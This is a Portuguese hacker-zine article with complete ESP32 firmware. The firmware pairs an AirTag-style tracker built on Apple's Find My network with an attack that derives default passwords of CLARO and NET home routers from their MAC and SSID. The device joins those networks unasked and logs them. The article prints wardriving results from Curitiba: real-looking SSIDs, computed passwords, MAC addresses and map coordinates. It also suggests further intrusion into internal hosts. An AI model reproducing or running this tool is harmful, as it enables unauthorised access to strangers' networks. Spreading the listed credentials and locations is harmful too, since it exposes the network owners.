@@ -1,0 +1,719 @@
+▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
+▒▓░   ░░▒░  ··  ░▒   ·········  ░▒▓░········· ░▒░ ░▒·  ░░▓▒▒
+░▒·    ░▒········░▒ ···☼·☼··☼··· ░▓· ···☼···☼··░▒░ ░▒▓   ░░▓
+▒▒    ····☼·····················░▒░ ············░  ···  ░▒·
+░░░  ···········☼·······☼··········░··········· ·· ···☼· ░░▒
+░░░····☼···············☼············☼··xd37@riseup.net···░░░
+ ·░····························☼··························░░
+ ······                                  ······∙∙∙∙∙∙∙∙∙∙∙·∙
+ ·····   Mapeando roteadores default    ·∙∙☼∙∙∙∙∙    ∙ ∙∙∙∙·
+ ····    usando microcontroladores     ·∙∙ ∙    ∙       ∙∙··
+ ····∙∙∙∙∙∙∙∙∙∙☼∙∙∙∙·∙∙☼∙···         ·☼∙∙     t         ∙··
+ ·∙☼∙∙∙☼∙∙∙:::::::::∙∙∙∙·∙∙∙∙···     ·        r      ∙  ∙ ·
+ ∙∙∙∙∙∙:::::       :::::::::∙∙∙∙∙·  ∙       trm 0x1    ∙☼:·
+ ·∙∙::::                   :::::∙∙∙∙∙     ∙       ∙  ∙∙∙·:·
+  ·:::                         ∙:::::∙∙∙∙··    ∙    ∙∙∙·:::·
+    ··                               :::::∙∙∙∙∙☼∙∙∙∙∙∙ :::∙ ·
+     ·                              ∙   ∙::::::···::::::    ·
+      ·~~{ conteudos 
+
+    ~{ 0 - intro
+    ~{ 1 - entendendo o tracking da apple
+    ~{ 2 - replicando uma airtag
+    ~{ 3 - juntando com DPWO
+    ~{ 4 - warwalking
+    ~{ 5 - conclusao
+
+
+~~{ 0 - intro
+
+esse projeto pareceu digno de ser uma tramoia e
+foi feito para divertir e mostrar que muito pode ser feito
+com hardware barato comum e pequeno, isso foi somente
+juntando 2 projetos que achei interessante e nao tem
+como intuito ser muito tecnico
+como quase sempre vc pode achar codigos assim
+de graca na internet facilmente e tudo ja esta
+mt bem documentado em ingles pelo menos
+entao a ideia tbm eh trazer um monte de pesquisas
+diferentes comprimidas pelo portugues informal,
+e em cima do mesmo topico incentivar
+a galera BR a dar mais atencao a isso e fazer as 
+proprias pesquisas/codigo, pq achei
+pouco conteudo em ptbr falando sobre e q
+ta facil fazer um rastreador mt barateza 
+com qualquer ESP ou STM, a precisao nao eh tanto igual
+a de um GPS porem faz seu trabalho na maioria dos casos
+
+sempre quando vi sobre wardriving me deparei com
+varias pessoas utilizando de modulos de GPS
+para saber a localizacao, porem nao queria que
+isso fosse necessario apenas para saber as cordenadas
+de um SSID pra upar no WiGLE ou algo do tipo =P
+queria algo alem disso, explorar redes mesmo
+
+ai comecei a pensar no que podia fazer para nao
+depender do GPS, e algumas semanas dps me deparei com
+um projeto chamado Openhaystack, que basicamente te
+permite a replicar o sinal da sua chave da airtag (vc precisa de
+um apple ID para pegar a public key) e acompanhar
+em tempo real! porem o codigo deles soh estava fazendo
+uma parte do que realmente queria fazer...
+
+
+~~{ 1 - entendendo o tracking da apple
+
+agora vamos ver sobre como eh possivel
+abusar dos dispositivos da apple para localizar seu
+microcontrolador como uma airtag
+
+como essas comunicacoes sao sempre feitas por bluetooth,
+nada mais justo que olharmos melhor o pacote enviado
+
+este pacote que fica sendo propagado por bluetooth tem 36 bytes e
+essa estrutura:
+
+-================-
+Bytes | Conteudo
+------------------
+0-5   |endereco do bluetooth
+------------------
+6     |tamanho do payload em bytes
+7     |tipo da propagacao (advertisement)
+8-9   |ID da compania
+10    |tipo de Offline Finding
+11    |tamanho do Offline Finding em bytes
+12    |status (sim, 1byte para transmitir data como nivel de bateria)
+13-34 |Public Key bytes
+35    |Public key bits
+36    |hint
+-================-
+
+o endereco do bluetooth fica implementado em outra parte do codigo
+ja que ele faz em todos disponiveis envolta.
+na pratica, esse eh o array de bytes q sao enviados:
+
+static uint8_t adv_data[31] = {
+    0x1e, /* Tamanho do payload em bytes (30) */
+    0xff, /* tipo da propagacao */
+    0x4c, 0x00, /* ID da compania (Apple) */
+    0x12, 0x19, /* tamanho do Offline Finding em bytes */
+    0x00, /* Status */
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, /* Public Key */
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+
+    0x00, /* First two bits */
+    0x00, /* Hint (0x00) */
+};
+
+
+agora que ja entendemos os bytes que sao enviados por bluetooth,
+vamos entender melhor o fluxo do que esta acontecendo de fato
+
+
+┌──────────┐                    
+│servers da│       ┌──────┐     
+│apple     ├───────►seu pc│     
+└──▲───────┘   [3] └──────┘     
+   │ [2]
+┌──┼─────────┐                  
+│dispositivos│     ┌──────────┐
+│aleatorios  ◄─────┼sua airtag│
+│da apple    │ [1] └──────────┘
+│por ai      │                  
+└────────────┘
+
+1 - os 31 bytes sao enviados para dispositivos envolta
+2 - os dispositivos aleatorios atualizam os servers da apple
+3 - basicamente vc pode interagir com os servers da apple agora de
+ varios jeitos diferentes
+
+
+
+~~{ 2 - replicando uma airtag
+
+entao blz, primeiro passo foi portar o codigo em
+https://github.com/seemoo-lab/openhaystack/blob/main/Firmware/ESP32/main/openhaystack_main.c
+para fazer funcionar no ESP32-S3 soh tive que criar uma funcao de 
+_loop e fazer com que ele nao fizesse advertising quando o bluetooth
+esta em modo ESP_BT_MODE_BLE, foi soh chamar 
+esp_ble_gap_stop_advertising()
+denovo e o codigo funcionava! agora temos uma airtag com um
+hardware com um preco muito bom!
+
+outro repo que vc vai precisar tbm eh o
+https://github.com/MatthewKuKanich/FindMyFlipper
+se vc for explorar o repositorio, vai perceber que
+pode subir um docker com esse anisette-v3
+
+em AirTagGeneration o arquivo request_reports.py
+vai ser responsavel por retornar os dados do openhaystack,
+unica modificacao que fiz nesse codigo foi
+
+    tag['url'] = 'https://www.openstreetmap.org/#map=18/' + str(
+        tag['lat']) + '/' + str(tag['lon'])
+
+para gerar o output sem link do googlemaps
+
+dentro de AirTagGeneration vc tbm pode gerar chaves com o 
+generate_keys.py vc vai precisar copiar seu "Advertisement key:", 
+decodificar o base64 e salvar em um arquivo
+
+    echo "<base64-adv-key>"|base64 -d>/tmp/chave
+
+
+agr faca um hexdump da sua chave e substitua no codigo fonte do .ino 
+na linha 37 para usar sua chave publica
+
+    xxd -i /tmp/chave /tmp/codigo.h
+
+
+esse eh um exemplo de output do request_reports.py
+quando tudo da certo e vc ja propagou do microcontrolador para algum 
+device, agora vc ta puxando do server da apple
+
+xd@pc ~/t/F/AirTagGeneration (main)> python3 request_reports.py -H 10
+pyprovision is not installed, querying http://localhost:6969 for an anisette server
+200: 5 reports received.
+60 reports used.
+{'lat': -25.4321703, 'lon': -49.2669962, 'conf': 98, 'status': 0, 'timestamp': 1725xxxxxx, 'isodatetime': '2024-0x-xxTxx:xx:xx', 'key': 'xxx5eaefxxxb', 'url': 'https://www.openstreetmap.org/#map=18/-25.4321703/-49.2669962'}
+{'lat': -25.4325314, 'lon': -49.2668648, 'conf': 76, 'status': 0, 'timestamp': 1725xxxxxx, 'isodatetime': '2024-0x-xxTxx:xx:xx', 'key': 'xxx5eaefxxxb', 'url': 'https://www.openstreetmap.org/#map=18/-25.4325314/-49.2668648'}
+{'lat': -25.4371764, 'lon': -49.2657124, 'conf': 53, 'status': 0, 'timestamp': 1725xxxxxx, 'isodatetime': '2024-0x-xxTxx:xx:xx', 'key': 'xxx5eaefxxxb', 'url': 'https://www.openstreetmap.org/#map=18/-25.4371764/-49.2657124'}
+{'lat': -25.4377824, 'lon': -49.2674244, 'conf': 103, 'status': 0, 'timestamp': 1725xxxxxx, 'isodatetime': '2024-0x-xxTxx:xx:xx', 'key': 'xxx5eaefxxxb', 'url': 'https://www.openstreetmap.org/#map=18/-25.4377824/-49.2674244'}
+{'lat': -25.4380643, 'lon': -49.267303, 'conf': 46, 'status': 0, 'timestamp': 1725xxxxxx, 'isodatetime': '2024-0x-xxTxx:xx:xx', 'key': 'xxx5eaefxxxb', 'url': 'https://www.openstreetmap.org/#map=18/-25.4380643/-49.267303'}
+found:   ['xxxxeaexxxxx']
+missing: []
+
+agora preciso fazer o DPWO em C, pq dai consigo rodar nesses 
+microcontroladores sim, poderia fazer com micropython tb mas n qro =P
+
+entao agr ja temos um rastreador funcionando, hora de fzr ele ownar 
+algo
+
+
+~~{ 3 - juntando com DPWO
+
+somando isso ao DPWO (que eh genial pra pwnar wifi alheio)
+torna possivel fazer o tracking de todas as redes ownadas e as
+coordenadas ateh com um ESP32-C3 super mini! (tamanho: 22.52x18mm)
+
+entao a ideia basicamente eh:
+
+> DPWO acha rede vuln e o ESP32-S3 se conecta nela
+
+> (somente no primeiro host) fazer request para um server de NTP pra 
+pegar o timestamp atual e guardar junto do CSV para comparar depois
+
+> mandar requisicoes por bluetooth pra interagir com os iphones
+proximos e atualizar a localizacao
+
+> no final, faz a comparacao por timestamp e as localizacoes
+q pegamos da api da apple
+
+essa parte foi bem direta, pois ainda com a mesma logica do dpwo
+deu p ownar varios routers desatualizados
+acredito q o caioluders ja explicou muito bem em varios lugares o_o
+
+entao se vc ta na caverna e nao sabe oq eh DPWO ainda, recomendo que 
+pare aqui e veja os posts tipo o link [4] na conclusao ateh entender 
+do que se trata
+
+agora se vc ja sabe oq eh, vc ta sabe q eh soh
+pegar o MAC do roteador e SSID e parsear para
+obter a senha, caso ele esteja no padrao
+*agora os novos routers tem um padrao diferente, o router cria uma 
+senha fzndo algum algoritmo e eh possivel dumpar o firmware para 
+tentar entender como o novo padrao eh gerado
+
+lembrando que tbm no final, preciso guardar as informacoes coletadas
+e vamos fazer isso usando LittleFS, um filesystem no proprio 
+microcontrolador para nao depender de cartao SD tbm
+
+o codigo da tramoia esta no final deste arquivo entao vc mesmo pode 
+ler a source e entender ou modificar oq esta acontecendo
+
+
+~~{ 4 - warwalking
+
+agora vem a parte pratica! no caso a ideia era fzr um warbiking
+e com os resultados que receber, anotar os pontos com o
+SSID dos roteadores pwnados nas coordenadas recebidas e
+passar para o openstreetmap
+
+coloquei o esp32 na bag (sem antena) ligado
+a um powerbank e pedalei  pelo centro em um dia que nao tinha
+muitas pessoas, e os resultados nao foram mt bons...
+circulei por volta de 30 minutos no centro e
+esses sao os resultados da primeira pedalada
+no arquivo './a.csv' do LittleFS:
+
+    SSID,SENHA,MAC,TIMESTAMP
+    CLARO_2GAFB787,EFAFB787,743AEFAFB787,1725xxxxxx
+    CLARO_2G8DB5B3,388DB5B3,C85D388DB5B3,1725xxxxxx
+    CLARO_2G02A47B,E702A47B,9877E702A47B,1725xxxxxx
+    NET_2G095A79,E2095A79,E820E2095A79,1725xxxxxx
+
+pq sera soh 4 redes vuln?
+isso eh pq no codigo, assim que tentamos conectar em um
+wifi, precisamos fazer uma comparacao e ver o status do wifi
+para ver se estou conectado, o que foi usado um delay de 4 segundos
+que afetou os resultados pq enquanto estava pedalando
+e dentro dessa janela de tempo saisse do alcance do wifi
+tambem iria desconectar da rede + meu sinal era curto sem antena e 
+dentro da bag. entao recomendo que altere esse delay dependendo do 
+caso que vc for usar e nao pode ser mt curto tbm
+
+lembrando que tambem soh iria fzr o advertisement da chave
+apos ter pwnado uma rede e depende de dispositivos da apple prox
+
+e como nao sou tao ciclista assim
+
+depois realizei um teste andando mesmo pela XV (rua conhecida)
+em um dia muito movimentado no horario de almoco
+e os resultados foram muito diferentes...
+
+andei por aprox 60 minutos e me conectei em 13 roteadores diferentes
+esses foram os resultados apos filtrar o que ficou salvo no .csv e 
+comparar com as timestamps do openhaystack
+
+SSID,SENHA,BSSID(MAC) CRU,TIMESTAMP,LINK OPENSTREETMAP
+CLARO_2GF45F0C,1FF45F0C,ECA81FF45F0C,17266xxxxx,openstreetmap.org/#ma
+p=18/-25.4325618/-49.2760825
+CLARO_2G8E841A,A38E841A,841EA38E841A,17267xxxxx,openstreetmap.org/#ma
+p=18/-25.431804/-49.2770474
+CLARO_2G499A82,E5499A82,B0BBE5499A82,17267xxxxx,openstreetmap.org/#ma
+p=18/-25.4325458/-49.2749072
+NET_2GEEE2B0,69EEE2B0,2C9569EEE2B0,17267xxxxx,openstreetmap.org/#map=
+18/-25.4323242/-49.2749558
+CLARO_2G986E2A,12986E2A,840112986E2A,17267xxxxx,openstreetmap.org/#ma
+p=18/-25.4321298/-49.2741386
+NET_2G2A4974,2F2A4974,D4B92F2A4974,17267xxxxx,openstreetmap.org/#map=
+18/-25.4320586/-49.2744143
+CLARO_2GE2DB11,B4E2DB11,8CC5B4E2DB11,17267xxxxx,openstreetmap.org/#ma
+p=18/-25.4317459/-49.2731804
+CLARO_2G5946C8,DA5946C8,8020DA5946C8,17267xxxxx,openstreetmap.org/#ma
+p=18/-25.4318492/-49.2734772
+NET_2G88F04F,5C88F04F,54A65C88F04F,17267xxxxx,openstreetmap.org/#map=
+18/-25.4318032/-49.2734319
+CLARO_2GC955B9,BBC955B9,A86ABBC955B9,17267xxxxx,openstreetmap.org/#ma
+p=18/-25.4315053/-49.2725334
+CLARO_2GAC0BC0,C3AC0BC0,90AAC3AC0BC0,17267xxxxx,openstreetmap.org/#ma
+p=18/-25.4313985/-49.2721424
+CLARO_2G93699C,1293699C,84011293699C,17267xxxxx,openstreetmap.org/#ma
+p=18/-25.4312772/-49.2716799
+CLARO_2GD14265,BBD14265,A86ABBD14265,17267xxxxx,openstreetmap.org/#ma
+p=18/-25.4311774/-49.2720125
+
+
+eh ok... esperava mais, porem ainda acredito que tem como fazer 
+alguma corrida bem melhor que essa e ownar bem mais, e depende 
+daonde vc vai tbm claro XD
+
+no codigo vc pode fazer qlqr coisa dentro
+da rede da pessoa depois de conectado, tentar verificar
+alguma versao e exploitar algo para pegar persistencia, enumerar 
+hosts internos, etc as possibilidades dps de conectado sao infinitas
+
+
+~~{ 5 - conclusao
+
+agora mais empresas grandes estao comecando a usar essa
+tecnologia para criar a rede deles de localizacao
+como o que esta sendo com a samsung e google, no caso da
+samsung ela ja produz as smart tags dela e ja eh compativel
+com quem usa o ambiente da samsung e a nova linha do
+Pixel ja vai vir com compatibilidade para uma rede parecida
+
+imagine se um mesmo dispositivo pequeno pudesse 
+interagir com cada um desses servicos independentemente,
+alem de ter um rastreador mt bom e barato usando a rede
+das evil techs pra localizar qlqr plaquinha enquanto exploita algo
+
+espero q tenham curtido o texto, nos vemos pela net
+
+s4lv3 a todos q curtem uma tramoia.
+
+refs:
+- [1] https://petsymposium.org/popets/2021/popets-2021-0045.pdf
+- [2] https://github.com/MatthewKuKanich/FindMyFlipper
+- [3] https://github.com/seemoo-lab/openhaystack
+- [4] https://lude.rs/h4ck1ng/NET_2GXXXX_default_password.html
+- [5] https://docs.espressif.com
+
+
+arquivos:
+main.ino
+´´´
+#include <WiFi.h>
+#include <regex>
+#include <stdint.h>
+#include <string.h>
+#include <stdbool.h>
+#include <stdio.h>
+#include <FS.h>
+#include <LittleFS.h>
+#include "nvs_flash.h"
+#include "esp_bt.h"
+#include "esp_gap_ble_api.h"
+#include "esp_gattc_api.h"
+#include "esp_gatt_defs.h"
+#include "esp_bt_main.h"
+#include "esp_bt_defs.h"
+#include "freertos/FreeRTOS.h"
+#include <NTPClient.h>
+#include <Timezone.h>
+
+int num_rede = 0;
+bool is_timezone_set, achou_dpwo;
+
+const char* ntpServer = "pool.ntp.org";
+long  selectedTimezone;
+const int   daylightOffset_sec = 0;
+int hora;
+
+TimeChangeRule BRST = {"BRST", Last, Sun, Oct, -3, hora};
+Timezone myTZ(BRST, BRST);
+
+WiFiUDP ntpUDP;
+NTPClient timeClient(ntpUDP, ntpServer, selectedTimezone, daylightOffset_sec);
+
+// definicoes do openhaystack
+
+// mude aqui para sua chave publica
+uint8_t public_key_decoded[28] = {
+    0x13, 0x45, 0xea, 0xef, 0xc0, 0xbb, 0x9c, 0x20,
+    0xe7, 0x94, 0x72, 0xb6, 0x09, 0x43, 0x75, 0xa3,
+    0x98, 0x2a, 0xd3, 0x9f, 0xbc, 0xb9, 0x5f, 0x94,
+    0xd1, 0xc6, 0xb6, 0xdd
+};
+
+/** Callback function for BT events */
+static void esp_gap_cb(esp_gap_ble_cb_event_t event, esp_ble_gap_cb_param_t *param);
+
+/** Random device address */
+static esp_bd_addr_t rnd_addr = { 0xFF, 0xBB, 0xCC, 0xDD, 0xEE, 0xFF };
+
+/** Advertisement payload */
+static uint8_t adv_data[31] = 
+{
+    0x1e, /* Tamnhado do payload em bytes (30) */
+    0xff, /* Tipo da propagacao (type 0xff) */
+    0x4c, 0x00, /* Id da compania (Apple) */
+    0x12, 0x19, /* tamanho do Offline Finding em bytes */
+    0x00, /* Status */
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+    0x00, /* First two bits */
+    0x00, /* Hint (0x00) */
+};
+
+/* https://docs.espressif.com/projects/esp-idf/en/latest/esp32/api-reference/bluetooth/esp_gap_ble.html#_CPPv420esp_ble_adv_params_t */
+static esp_ble_adv_params_t ble_adv_params = 
+{
+    // Advertising min interval:
+    // Minimum advertising interval for undirected and low duty cycle
+    // directed advertising. Range: 0x0020 to 0x4000 Default: N = 0x0800
+    // (1.28 second) Time = N * 0.625 msec Time Range: 20 ms to 10.24 sec
+    .adv_int_min        = 0x0640, // 1s
+    // Advertising max interval:
+    // Maximum advertising interval for undirected and low duty cycle
+    // directed advertising. Range: 0x0020 to 0x4000 Default: N = 0x0800
+    // (1.28 second) Time = N * 0.625 msec Time Range: 20 ms to 10.24 sec
+    .adv_int_max        = 0x0C80, // 2s
+    // Advertisement type
+    .adv_type           = ADV_TYPE_NONCONN_IND,
+    // Use the random address
+    .own_addr_type      = BLE_ADDR_TYPE_RANDOM,
+    // All channels
+    .channel_map        = ADV_CHNL_ALL,
+    // Allow both scan and connection requests from anyone. 
+    .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
+};
+
+static void esp_gap_cb(esp_gap_ble_cb_event_t event, esp_ble_gap_cb_param_t *param)
+{
+    esp_err_t err;
+
+    switch (event) {
+        case ESP_GAP_BLE_ADV_DATA_RAW_SET_COMPLETE_EVT:
+            esp_ble_gap_start_advertising(&ble_adv_params);
+            break;
+
+        case ESP_GAP_BLE_ADV_START_COMPLETE_EVT:
+            if ((err = param->adv_start_cmpl.status) != ESP_BT_STATUS_SUCCESS) {
+            } else {
+                Serial.print("advertising has started\n");
+
+            }
+            break;
+
+        case ESP_GAP_BLE_ADV_STOP_COMPLETE_EVT:
+            if ((err = param->adv_stop_cmpl.status) != ESP_BT_STATUS_SUCCESS){
+                Serial.printf("adv stop failed: %s\n", esp_err_to_name(err));
+            }
+            else {
+                Serial.println("stop adv successfully\n");
+
+            }
+            break;
+        default:
+            break;
+    }
+}
+
+void set_addr_from_key(esp_bd_addr_t addr, uint8_t *public_key_decoded)
+{
+    addr[0] = public_key_decoded[0] | 0b11000000;
+    addr[1] = public_key_decoded[1];
+    addr[2] = public_key_decoded[2];
+    addr[3] = public_key_decoded[3];
+    addr[4] = public_key_decoded[4];
+    addr[5] = public_key_decoded[5];
+}
+
+void set_payload_from_key(uint8_t *payload, uint8_t *public_key_decoded)
+{
+    memcpy(&payload[7], &public_key_decoded[6], 22);
+    payload[29] = public_key_decoded[0] >> 6;
+}
+
+void openhaystack_setup()
+{
+    Serial.printf("using device address: %02x %02x %02x %02x %02x %02x\n", rnd_addr[0], rnd_addr[1], rnd_addr[2], rnd_addr[3], rnd_addr[4], rnd_addr[5]);
+
+    //esp_ble_gap_stop_advertising();
+
+    esp_err_t status;
+    //register the scan callback function to the gap module
+    if ((status = esp_ble_gap_register_callback(esp_gap_cb)) != ESP_OK) {
+        //ESP_LOGE(LOG_TAG, "gap register error: %s", esp_err_to_name(status));
+        Serial.printf("gap register error: %s\n", esp_err_to_name(status));
+        return;
+    }
+
+    if ((status = esp_ble_gap_set_rand_addr(rnd_addr)) != ESP_OK) {
+        //ESP_LOGE(LOG_TAG, "couldn't set random address: %s", esp_err_to_name(status));
+        Serial.printf("couldn't set random address: %s\n", esp_err_to_name(status));
+        return;
+    }
+    if ((esp_ble_gap_config_adv_data_raw((uint8_t*)&adv_data, sizeof(adv_data))) != ESP_OK) {
+        //ESP_LOGE(LOG_TAG, "couldn't configure BLE adv: %s", esp_err_to_name(status));
+        Serial.printf("couldn't configure BLE adv: %s\n", esp_err_to_name(status));
+        return;
+    }
+
+
+    Serial.println("application initialized");
+    Serial.println(status);
+
+}
+
+//essas peguei daki https://randomnerdtutorials.com/esp32-write-data-littlefs-arduino/
+
+void appendFile(fs::FS &fs, const char * path, const char * message)
+{
+    File file = fs.open(path, FILE_APPEND);
+    if(!file)
+    {
+        Serial.println("- failed to open file for appending");
+        return;
+    }
+    if(file.print(message))
+    {
+        //Serial.println("- message appended");
+    } else {
+        Serial.println("- append failed");
+    }
+    file.close();
+}
+
+void readFile(fs::FS &fs, const char * path)
+{
+    File file = fs.open(path);
+    if(!file || file.isDirectory())
+    {
+        Serial.println("- failed to open file for reading");
+        return;
+    }
+
+    Serial.println("-- read from file:");
+    while(file.available())
+    {
+        Serial.write(file.read());
+    }
+    file.close();
+}
+
+//funcoes do dpwo
+
+void net(int i)
+{
+    char bssid_cru[18];
+    char bssid_parseado[18];
+
+    strcpy(bssid_cru, WiFi.BSSIDstr(i).c_str());
+
+    int j = 0;
+    for (int x = 0; bssid_cru[x] != '\0'; ++x)
+    {
+        if (bssid_cru[x] != ':') {
+            bssid_parseado[++j] = bssid_cru[x];
+        }
+    }
+    bssid_parseado[j] = '\0';
+
+    char *senha_final = bssid_parseado + 4; 
+    senha_final[strlen(senha_final)-6] = '\0';
+    int tamanho_ssid = WiFi.SSID(i).length();
+    if (tamanho_ssid >= 2)
+    {
+      String ultimo_dois = WiFi.SSID(i).substring(tamanho_ssid - 6);
+      strcat(senha_final, ultimo_dois.c_str());
+    } else {
+      Serial.println("ERROR");
+    }
+    Serial.println(WiFi.SSID(i).c_str());
+    Serial.println(senha_final);
+
+    WiFi.begin(WiFi.SSID(i).c_str(), senha_final);
+    delay(4000);
+    while (WiFi.status() != WL_CONNECTED)
+    {
+      WiFi.disconnect();
+      return;
+    }
+
+    Serial.println("NET CONECTADO");
+    
+    if(!is_timezone_set)
+    {
+      timeClient.begin();
+      is_timezone_set=true;
+    }
+    timeClient.update();
+    
+    appendFile(LittleFS, "/a.csv", WiFi.SSID(i).c_str());
+    appendFile(LittleFS, "/a.csv", ",");
+    appendFile(LittleFS, "/a.csv", senha_final);
+    appendFile(LittleFS, "/a.csv", ",");
+    appendFile(LittleFS, "/a.csv", bssid_parseado);
+    appendFile(LittleFS, "/a.csv", ",");
+    appendFile(LittleFS, "/a.csv", String(timeClient.getEpochTime()).c_str());
+    appendFile(LittleFS, "/a.csv", "\n");
+
+    achou_dpwo=true;
+    WiFi.disconnect();
+    //WiFi.mode(WIFI_OFF);
+}
+
+void claro(int i)
+{
+    char bssid_cru[18];
+    char bssid_parseado[18];
+
+    strcpy(bssid_cru, WiFi.BSSIDstr(i).c_str());
+
+    int j = 0;
+    for (int x = 0; bssid_cru[x] != '\0'; ++x) {
+      if (bssid_cru[x] != ':') {
+        bssid_parseado[++j] = bssid_cru[x];
+      }
+    }
+    bssid_parseado[j] = '\0';
+
+    char *senha_final = bssid_parseado + 4;
+    senha_final[strlen(senha_final)-2] = '\0';
+    int tamanho_ssid = WiFi.SSID(i).length();
+    if (tamanho_ssid >= 2)
+    {
+        String ultimo_dois = WiFi.SSID(i).substring(tamanho_ssid - 2);
+        strcat(senha_final, ultimo_dois.c_str());
+    }
+
+    Serial.println(WiFi.SSID(i).c_str());
+    Serial.println(senha_final);
+
+    WiFi.begin(WiFi.SSID(i).c_str(), senha_final);
+    delay(4000);
+    while (WiFi.status() != WL_CONNECTED)
+    {
+      WiFi.disconnect();
+      //WiFi.mode(WIFI_OFF);
+      return;
+    }
+
+    Serial.println("CLARO CONECTADO");
+    
+    if(!is_timezone_set){
+      timeClient.begin();
+      is_timezone_set=true;
+    }
+    timeClient.update();
+    
+    appendFile(LittleFS, "/a.csv", WiFi.SSID(i).c_str());
+    appendFile(LittleFS, "/a.csv", ",");
+    appendFile(LittleFS, "/a.csv", senha_final);
+    appendFile(LittleFS, "/a.csv", ",");
+    appendFile(LittleFS, "/a.csv", bssid_parseado);
+    appendFile(LittleFS, "/a.csv", ",");
+    appendFile(LittleFS, "/a.csv", String(timeClient.getEpochTime()).c_str());
+    appendFile(LittleFS, "/a.csv", "\n");
+
+    achou_dpwo=true;
+    WiFi.disconnect();
+    //WiFi.mode(WIFI_OFF);
+}
+
+void setup()
+{
+    Serial.begin(115200);
+    WiFi.mode(WIFI_STA);
+    num_rede = WiFi.scanNetworks();
+
+  LittleFS.begin();
+
+  esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
+    esp_bt_controller_init(&bt_cfg);
+    esp_bt_controller_enable(ESP_BT_MODE_BLE);
+
+    esp_bluedroid_init();
+    esp_bluedroid_enable();
+    //esp_bt_controller_enable(ESP_BT_MODE_BLE);
+
+    set_addr_from_key(rnd_addr, public_key_decoded);
+    set_payload_from_key(adv_data, public_key_decoded);
+    Serial.println("Fim do setup");
+}
+
+void loop()
+{
+    WiFi.mode(WIFI_STA);
+    std::regex net_regex("NET_.*");
+    std::regex claro_regex("CLARO_.*");
+
+    for (int i = 0; i < num_rede; ++i)
+    {
+        if (std::regex_search(WiFi.SSID(i).c_str(), claro_regex))
+        {
+            claro(i);
+        } else if (std::regex_search(WiFi.SSID(i).c_str(), net_regex))
+        {
+            net(i);
+        } else {
+        }
+    }
+    num_rede = WiFi.scanNetworks();
+
+    //para poder copiar pelo serial
+    readFile(LittleFS, "/a.csv");
+
+    if(achou_dpwo)
+    {
+      openhaystack_setup();
+      achou_dpwo=false;
+    }
+}
+```
+EOF
